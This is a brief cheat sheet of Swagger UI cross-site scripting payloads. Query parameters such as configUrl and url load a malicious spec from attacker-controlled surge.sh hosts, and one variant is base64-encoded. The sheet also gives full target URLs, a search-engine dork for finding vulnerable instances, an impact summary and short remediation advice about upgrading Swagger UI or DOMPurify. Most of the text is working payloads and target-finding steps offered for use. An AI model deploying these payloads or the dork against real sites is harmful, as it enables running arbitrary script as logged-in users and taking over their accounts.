
## Swagger UI can be found at /classicapi/doc/

### Payloads:

• `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`

• `?configUrl=https://jumpy-floor.surge.sh/test.json`

• `?url=https://jumpy-floor.surge.sh/test.yaml`

• The payload might not work, so we move on to the next payload, and so on.

### Final payload examples:
- `https://example.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`

- `https://example.com/classicapi/doc/?configUrl=https://jumpy-floor.surge.sh/test.json`

- `https://example.com/classicapi/doc/?url=https://jumpy-floor.surge.sh/test.yaml`

### Find Swagger UI using dorks:
`intext:"Swagger UI" intitle:"Swagger UI" site:yourtarget.com`
(the dork yields some false positives, but it's good enough)

### Impact:
- an attacker can execute arbitrary js code in the context of <vulnerable_url>
- it means he can do whatever authenticated user at <vulnerable_url> could do

### Remediation:
- q: you have found a vulnerable swagger ui version in your organization, now what?
- a: it is simple, just update to the latest version. check out npm-update for more info

- q: what if you can't upgrade the whole swagger ui package?
- a: you can upgrade only the dompurify package that is used by swagger ui

